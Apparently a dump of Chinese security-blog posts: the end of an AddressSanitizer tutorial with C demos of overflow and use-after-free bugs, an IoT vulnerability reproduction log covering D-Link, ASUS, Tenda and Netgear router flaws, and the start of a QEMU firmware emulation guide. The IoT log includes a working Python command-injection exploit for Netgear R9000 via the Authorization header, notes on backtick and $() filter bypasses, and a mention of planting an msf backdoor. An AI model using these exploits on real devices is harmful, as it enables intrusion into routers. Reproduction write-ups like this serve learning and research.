./stack<br></code></pre></td></tr></table></figure><p><img src="/img/ASAN/0.png" alt="img"></p><p>这里面其实可以很清楚的看到mem memory和shadow memory之间的换算以及Report Error的调用</p><p>至于汇编层面的，笔者在这边贴出<a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm">官方文档</a>中的example</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># long load8(long *a) &#123; return *a; &#125;</span><br><span class="hljs-attribute">0000000000000030</span> &lt;load8&gt;:<br>  <span class="hljs-attribute">30</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f8             mov    %rdi,%rax<br>  <span class="hljs-attribute">33</span>:<span class="hljs-number">48</span> c1 e8 <span class="hljs-number">03</span>          shr    $<span class="hljs-number">0</span>x3,%rax<br>  <span class="hljs-attribute">37</span>:<span class="hljs-number">80</span> b8 <span class="hljs-number">00</span> <span class="hljs-number">80</span> ff <span class="hljs-number">7</span>f <span class="hljs-number">00</span> cmpb   $<span class="hljs-number">0</span>x0,<span class="hljs-number">0</span>x7fff8000(%rax)<br>  <span class="hljs-attribute">3e</span>:<span class="hljs-number">75</span> <span class="hljs-number">04</span>                jne    <span class="hljs-number">44</span> &lt;load8+<span class="hljs-number">0</span>x14&gt;<br>  <span class="hljs-attribute">40</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">07</span>             mov    (%rdi),%rax   &lt;&lt;&lt;&lt;&lt;&lt; original load<br>  <span class="hljs-attribute">43</span>:c3                   retq   <br>  <span class="hljs-attribute">44</span>:<span class="hljs-number">52</span>                   push   %rdx<br>  <span class="hljs-attribute">45</span>:e8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  __asan_report_load8<br><span class="hljs-comment"># int  load4(int *a)  &#123; return *a; &#125;</span><br><span class="hljs-attribute">0000000000000000</span> &lt;load4&gt;:<br>   <span class="hljs-attribute">0</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f8             mov    %rdi,%rax<br>   <span class="hljs-attribute">3</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fa             mov    %rdi,%rdx<br>   <span class="hljs-attribute">6</span>:<span class="hljs-number">48</span> c1 e8 <span class="hljs-number">03</span>          shr    $<span class="hljs-number">0</span>x3,%rax<br>   <span class="hljs-attribute">a</span>:<span class="hljs-number">83</span> e2 <span class="hljs-number">07</span>             and    $<span class="hljs-number">0</span>x7,%edx<br>   <span class="hljs-attribute">d</span>:<span class="hljs-number">0</span>f b6 <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">80</span> ff <span class="hljs-number">7</span>f movzbl <span class="hljs-number">0</span>x7fff8000(%rax),%eax<br>  <span class="hljs-attribute">14</span>:<span class="hljs-number">83</span> c2 <span class="hljs-number">03</span>             add    $<span class="hljs-number">0</span>x3,%edx<br>  <span class="hljs-attribute">17</span>:<span class="hljs-number">38</span> c2                cmp    %al,%dl<br>  <span class="hljs-attribute">19</span>:<span class="hljs-number">7</span>d <span class="hljs-number">03</span>                jge    <span class="hljs-number">1</span>e &lt;load4+<span class="hljs-number">0</span>x1e&gt;<br>  <span class="hljs-attribute">1b</span>:<span class="hljs-number">8</span>b <span class="hljs-number">07</span>                mov    (%rdi),%eax    &lt;&lt;&lt;&lt;&lt;&lt; original load<br>  <span class="hljs-attribute">1d</span>:c3                   retq   <br>  <span class="hljs-attribute">1e</span>:<span class="hljs-number">84</span> c0                test   %al,%al<br>  <span class="hljs-attribute">20</span>:<span class="hljs-number">74</span> f9                je     <span class="hljs-number">1</span>b &lt;load4+<span class="hljs-number">0</span>x1b&gt;<br>  <span class="hljs-attribute">22</span>:<span class="hljs-number">50</span>                   push   %rax<br>  <span class="hljs-attribute">23</span>:e8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  __asan_report_load4<br></code></pre></td></tr></table></figure><h1 id="0x2-报错查看"><a href="#0x2-报错查看" class="headerlink" title="0x2: 报错查看"></a>0x2: 报错查看</h1><p>md，写了半天，才发现github里有官方给的demo，草了</p><p>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p><h2 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h2><p>demo：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> stack1[<span class="hljs-number">0x10</span>];<br>  <span class="hljs-type">char</span> stack2[<span class="hljs-number">0x10</span>];<br>  <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome to korey&#x27;s test&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pls input: &quot;</span>);<br>  <span class="hljs-built_in">gets</span>(stack1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done&quot;</span>);<br>  <br>  <span class="hljs-keyword">return</span> stack2[<span class="hljs-number">0x10</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>当输入的内容较少时，会正常出现stack overflow的报错</p><p><img src="/img/ASAN/1.png" alt="img"></p><p><img src="/img/ASAN/2.png" alt="img"></p><p>图一框一：</p><ul><li>漏洞类型——stack overflow</li><li>报错地址，pc、sp、bp等寄存器的值</li><li>在线程T0栈地址0x7ffff0291120进行read操作时，检测到错误</li><li>错误代码位于stack.c的14行</li></ul><p>图一框二</p><ul><li>漏洞地址0x7ffff0291120位于T0线程的栈中偏移80处，并指出漏洞存在的变量</li></ul><p>图二</p><ul><li>shadow memory 展示</li><li>因为1字节的shadow memory对应8字节的mem memory，所以<code>f1 f1 f1 f1</code>与<code>f2 f2</code>之间的区域为<code>stack1</code>对应的shadow memory，<code>stack2</code>同理</li><li>因为造成漏洞的时<code>return stack2[0x10];</code>，所以第一个f3被标识，表示此处投毒发现漏洞</li></ul><p>此图的下半部分则为各种符号代表的含义</p><p>因为demo中使用了get，尝试输入大量数据造成栈溢出</p><p><img src="/img/ASAN/3.png" alt="img"></p><p>但好像并不能输出log信息</p><p>那就进gdb康康</p><p>可以看到在最后调用__asan_report时，函数参数已经指向了dirty data，那就说明原本正常运行时ASAN多开辟出来的栈空间被恶意操作时会导致功能crash</p><p><img src="/img/ASAN/4.png" alt="img"></p><p>笔者后来又试试了只有gets函数的demo，发现就算用ASAN编译也只会报出stack smash</p><p>铸币笔者认为，ASAN更倾向于在编译的时候就标注出漏洞，当执行到这个漏洞时引发报错，就像在fuzz中，这可能算是个代码覆盖率的问题，执行到漏洞存在分支便crash。而对于gets这种依赖用户输入的危险函数，ASAN在编译的时候并不能精确定义其危险性，故并没有进行检测。</p><p>笔者的说法可能有失偏颇，各位大师傅们如果有什么想法可以在评论区留言呜呜呜。</p><h2 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h2><p>和stack overflow类似，就不细讲了</p><p>demo</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *heap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-type">char</span> test =  heap[<span class="hljs-number">0x10</span>];<br>  <br>  <span class="hljs-built_in">free</span>(heap);<br>  *heap = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ASAN_log</p><p><img src="/img/ASAN/5.png" alt="img"></p><h2 id="global-buffer-overflow"><a href="#global-buffer-overflow" class="headerlink" title="global buffer overflow"></a>global buffer overflow</h2><p>同上</p><p>demo:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">char</span> global[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> global[<span class="hljs-number">0x10</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>但是ASAN_log很奇怪</p><p><img src="/img/ASAN/6.png" alt="img"></p><p>特别是明明gloabl才0x10个字节大小，shadow memory前面那么大一块区域</p><p>且当我将当demo 换成<code>return global[-1]</code>时，直接显示正常了。</p><p>？？？</p><p>如果有师傅知道是什么情况能不能联系一下铸币笔者呜呜</p><p>跪谢</p><h2 id="use-after-free"><a href="#use-after-free" class="headerlink" title="use after free"></a>use after free</h2><p>demo:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *heap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br> <br>  <span class="hljs-built_in">free</span>(heap);<br>  <span class="hljs-keyword">return</span> heap[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>ASAN_log</p><p><img src="/img/ASAN/7.png" alt="img"></p><h2 id="memory-leak"><a href="#memory-leak" class="headerlink" title="memory leak"></a>memory leak</h2><p>内存泄露其实就是内存分配后没有释放，导致内存空间中有数据残留</p><p>demo:</p><p>没有free掉堆块</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *heap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ASAN_log</p><p><img src="/img/ASAN/8.png" alt="img"></p><h2 id="stack-use-after-scope"><a href="#stack-use-after-scope" class="headerlink" title="stack use after scope"></a>stack use after scope</h2><p>stack-use-after-scope指的是超出定义域外对局部变量操作</p><p>demo:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> *p = <span class="hljs-number">0</span>;<br>  <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  &#123;<br>    <span class="hljs-type">int</span> test = <span class="hljs-number">0</span>;<br>    p = &amp;test;<br>  &#125;<br>  <br>  *p = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先用volatile指定一下指针p每次操作前都重新读一下值</p><p>ASAN_log</p><p><img src="/img/ASAN/9.png" alt="img"></p><h2 id="stack-use-after-return"><a href="#stack-use-after-return" class="headerlink" title="stack use after return"></a>stack use after return</h2><p>和stack-use-after-scope类似</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">char</span> *p;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>  p = &amp;buffer[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">func</span>();<br>  <span class="hljs-keyword">return</span> p[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>但是ASAN默认是不检测这个错误的，所以要使用<code>ASAN_OPTIONS=detect_stack_use_after_return=1</code>开启</p><p>ASAN_log</p><p><img src="/img/ASAN/10.png" alt="img"></p><h1 id="0x3-一些小bug"><a href="#0x3-一些小bug" class="headerlink" title="0x3: 一些小bug"></a>0x3: 一些小bug</h1><p>一：</p><p>可以看到，针对溢出类型的漏洞时，ASAN在shadow memory ‘s left or right投毒的区域是有限的，若溢出的范围超出投毒的范围或者恰好落在别的可用内存对应的shadow memory，则不会报错</p><p>二：</p><p>众所周知，例如在x86_64进行堆块分配时，一个chunk的前8个字节是可以被前一chunk使用的，但这却会被ASAN检测出heap overflow</p><p><img src="/img/ASAN/11.png" alt="img"></p><p>三：</p><p>当内存分配未8字节对齐时</p><p><img src="/img/ASAN/12.png" alt="img"></p><p>可以看到这边有一个shadow memory为<code>04</code>，结合上文所提到的shadow memory的9钟可能值，可知此处有4个字节被投毒</p><h1 id="0x4-最后的最后"><a href="#0x4-最后的最后" class="headerlink" title="0x4: 最后的最后"></a>0x4: 最后的最后</h1><p>花了两天时间大致了解了一下ASAN，总的来说这个工具还是很好用的，虽然有些小问题，但这很大一部分原因是语言导致的。</p><p>其实官方的文档写的超级详细，各位大师傅如果想深入了解ASAN可以直接去google的<a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">仓库</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ASAN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot漏洞复现小记</title>
    <link href="/2023/08/05/iot%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/05/iot%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0: 写在所有之前"></a>0x0: 写在所有之前</h1><p>直接莽漏洞复现了</p><p>搞了个iotsec的账号，这边复现的主要是里面iot靶场里的洞</p><p>总感觉他TM靶机有大问题，所以笔者这记录的全为本地remake</p><h1 id="0x1-大致的漏洞挖掘流程"><a href="#0x1-大致的漏洞挖掘流程" class="headerlink" title="0x1: 大致的漏洞挖掘流程"></a>0x1: 大致的漏洞挖掘流程</h1><p>笔者希望在这二三十个漏洞复现完后能总结出一个高效率的iot漏洞挖掘流程</p><p>但暂时还没什么灵感呜呜呜呜</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>8-10，July：试了几个后门漏洞，先用firmwalker看看有没有敏感文件</p><p>10-15，July：挖了totolink T10，熟悉了以mqtt为主题的webserver</p><p>17-20，July：totolink A720R，totolink大量存在的未授权认证漏洞，以及以http为主体的webserver，cstecgi.cgi</p><p>8-13，August：Tenda AX3，patch binary of httpd来启动webserver，很正常的服务</p><p>15-17，August：一系列DLINK设备存在的问题，牵扯到upnp协议，用qemu很麻烦，所以笔者直接用FirmAE进行模拟，且FirmAE的-d模式能拿shell和patch pid调试，对于类似cgi这类存在时间很短的进程，winmt师傅的方法是patch掉一个地方，使程序进入无限循环从而使进程卡住，绝妙的想法！！</p><h1 id="0x2-Remake"><a href="#0x2-Remake" class="headerlink" title="0x2: Remake"></a>0x2: Remake</h1><h2 id="后门漏洞"><a href="#后门漏洞" class="headerlink" title="后门漏洞"></a>后门漏洞</h2><p>这种纯纯就是福利姬（好像有点奇怪，但这么说是一点问题没有）</p><h3 id="D-Link-DIR815后门漏洞"><a href="#D-Link-DIR815后门漏洞" class="headerlink" title="D-Link DIR815后门漏洞"></a>D-Link DIR815后门漏洞</h3><p>拿firmwalker一扫发现存在&#x2F;etc&#x2F;init0.d&#x2F;S80telnetd.sh</p><p><img src="/img/iot1/0.png" alt="img"></p><p>然后就telnet访问一下就好了</p><p>抽象的一批</p><h3 id="ASUS-RT-N10-ASUS-RT-N10-D1-授权命令执行漏洞"><a href="#ASUS-RT-N10-ASUS-RT-N10-D1-授权命令执行漏洞" class="headerlink" title="ASUS RT-N10&amp;ASUS RT-N10 D1 授权命令执行漏洞"></a>ASUS RT-N10&amp;ASUS RT-N10 D1 授权命令执行漏洞</h3><p>firmwalker扫完没什么发现</p><p>找一下固件中有没有syscmd这种敏感字符串，还真有</p><p><img src="/img/iot1/1.png" alt="img"></p><p>那用FirmAE模拟一下，试着访问一下这个Main_AdmStatus_Content.asp</p><p><img src="/img/iot1/2.png" alt="img"></p><p>随便搞</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Tenda-AC15命令执行（goform-setUsbUnload）"><a href="#Tenda-AC15命令执行（goform-setUsbUnload）" class="headerlink" title="Tenda AC15命令执行（goform&#x2F;setUsbUnload）"></a>Tenda AC15命令执行（goform&#x2F;setUsbUnload）</h3><p>TendaAC15老朋友了，先把httpd服务起起来</p><p>goform，很眼熟，估计起web服务的是gohead</p><p>漏洞描述都说是在setUsbUnload了，在httpd搜一下字符串</p><p><img src="/img/iot1/3.png" alt="img"></p><p>啊这，没有任何过滤，那就直接搞个POST请求看一下</p><p><img src="/img/iot1/4.png" alt="img"></p><p><img src="/img/iot1/5.png" alt="img"></p><h3 id="DIR818L命令执行-（-etc-script-IPV4-INET-PHP）"><a href="#DIR818L命令执行-（-etc-script-IPV4-INET-PHP）" class="headerlink" title="DIR818L命令执行 （&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHP）"></a>DIR818L命令执行 （&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHP）</h3><p>捏麻麻滴</p><p>审了半天，看了wp才知道是web洞，会不了一点</p><p>而且这个网路服务是HNAP1，SOAP协议的，xml语言看起来挺好懂得，就是这个功能API实在是太折磨了</p><h3 id="ASUS-RT-N10U-（ping-过滤不严）"><a href="#ASUS-RT-N10U-（ping-过滤不严）" class="headerlink" title="ASUS RT-N10U （ping 过滤不严）"></a>ASUS RT-N10U （ping 过滤不严）</h3><p>好像Ping命令检测网络联通性的地方挺容易出现RCE的</p><p>burp抓个包看看是什么情况</p><p><img src="/img/iot1/6.png" alt="img"></p><p>？SystemCmd，那就按照特定字符串搜一下，定位到&#x2F;usr&#x2F;sbin&#x2F;httpd，在里面找到了对应的函数</p><p><img src="/img/iot1/7.png" alt="img"></p><p>sys_script</p><p><img src="/img/iot1/8.png" alt="img"></p><p>可以看到，用get_cgi接受SystemCmd参数后，虽然有一点过滤。但是反引号**&#96; $()**这些内敛执行绕过并没有过滤掉</p><p>将V7拷贝到位于bss段的SystemCmd后，就直接用sys_script直接执行了，所以就是一个很简单的RCE</p><p>传了个msf生成的backdoor</p><p><img src="/img/iot1/9.png" alt="img"></p><h3 id="Netgear-R9000（-cgi-bin登录认证时没有对Authorizationg过滤）"><a href="#Netgear-R9000（-cgi-bin登录认证时没有对Authorizationg过滤）" class="headerlink" title="Netgear R9000（&#x2F;cgi-bin登录认证时没有对Authorizationg过滤）"></a>Netgear R9000（&#x2F;cgi-bin登录认证时没有对Authorizationg过滤）</h3><p>登录认证的时候没有对Authorization进行check</p><p>漏洞可以直接定位到&#x2F;usr&#x2F;sbin&#x2F;uhttpd中的<code>uh_cgi_auth_check</code></p><p><img src="/img/iot1/10.png" alt="img"></p><p>逻辑很简单，接收到Authorization的内容后，把<code>Basic </code>后的内容base64解密，并把password拼接后执行</p><p>本意是想把password的hash值保存到文件中，却因为过滤不严导致rce</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = &quot;http://81.68.182.195:56898/cgi-bin&quot;<br>cmd = base64.b64encode(b&quot;admin:;ls /&gt;/www/cmd.txt;&quot;)<br><br>headers=&#123;<br>    &quot;Host&quot;: &quot;81.68.182.195:56898&quot;,<br>    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,<br>    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36&quot;,<br>    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,<br>    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,<br>    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;,<br>    &quot;Connection&quot;: &quot;keep-alive&quot;,<br>    &quot;Authorization&quot;: b&quot;Basic &quot; + cmd,<br>&#125;<br># payload = &quot;ls &gt;/www/ls.txt&quot;<br># res = requests.<span class="hljs-keyword">get</span>(url=url,auth=(&quot;admin&quot;,payload))<br># print(res.text)<br>res = requests.<span class="hljs-keyword">get</span>(url=url,headers=headers,timeout=<span class="hljs-number">1</span>)<br>print(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/iot1/11.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Iot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>固件模拟指北</title>
    <link href="/2023/07/30/Fuzz1/"/>
    <url>/2023/07/30/Fuzz1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>固件模拟这个玩意笔者也不想多说什么，纯纯的折磨自己，但是还不得不搞（主要是实在是太穷没有米买设备）</p><p>最近把主流的固件模拟方法都过了一遍，于是笔者就想水篇博客顺带记点笔记。</p><p>鉴于固件模拟有各种薛定谔的报错，笔者使用的较为稳定的ubuntu20.04</p><p>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p><h1 id="0x1-框架模拟"><a href="#0x1-框架模拟" class="headerlink" title="0x1:框架模拟"></a>0x1:框架模拟</h1><p>直接工具一把梭哈</p><h2 id="FirmAE-Firmadyne"><a href="#FirmAE-Firmadyne" class="headerlink" title="FirmAE &amp; Firmadyne"></a>FirmAE &amp; Firmadyne</h2><p>这两个没什么好说的，能不能模拟起来纯靠运气</p><p>笔者更倾向于FirmAE一点，主要是懒狗一条，能直接一行command完事的事情谁会想搓一个启动脚本呢</p><p>关于这两个框架的具体信息可以直接在github找</p><p><a href="https://github.com/pr0v3rbs/FirmAE">pr0v3rbs&#x2F;FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis (github.com)</a></p><p><a href="https://github.com/firmadyne/firmadyne">firmadyne&#x2F;firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware (github.com)</a></p><h2 id="Fact-core"><a href="#Fact-core" class="headerlink" title="Fact_core"></a>Fact_core</h2><p>docker拉了两个小时没拉下来，捏麻麻滴，不做评价</p><h1 id="0x2-Qemu模拟"><a href="#0x2-Qemu模拟" class="headerlink" title="0x2:Qemu模拟"></a>0x2:Qemu模拟</h1><p>有一说一虚拟化真的是个神奇的技术，笔者现在也对<strong>Virtualization</strong>逐渐起了兴趣</p><p>言归正传，qemu模拟有两个不同的模式，user模式和system模式，在本篇博客中，两种模式都会详细介绍</p><h2 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu user"></a>qemu user</h2><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>user模式下模拟较为便捷，这边就以典型的<strong>Tenda AC15</strong>来作为例子<a href="(https://www.tenda.com.cn/download/detail-2680.html)">固件下载</a></p><p>先看一下架构（一般都是查看&#x2F;bin&#x2F;busybox），是arm，小端序，动态链接</p><p>且在&#x2F;bin中存在httpd可执行文件，于是我们就可以尝试运行一下httpd</p><p>首先因为httpd是异架构的动态链接，所以模拟的时候最好直接用静态编译的qemu</p><p>先下载qemu-user-static</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span><span class="hljs-operator">-</span><span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure><p>然后找到对应架构的qemu-user-static，复制到当前文件夹下</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">which qemu-arm-<span class="hljs-keyword">static</span><br>cp [path <span class="hljs-keyword">to</span> qemu-arm-<span class="hljs-keyword">static</span>] .``<br></code></pre></td></tr></table></figure><p>将squashfs-root切换为根目录，user模式执行.&#x2F;bin&#x2F;httpd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 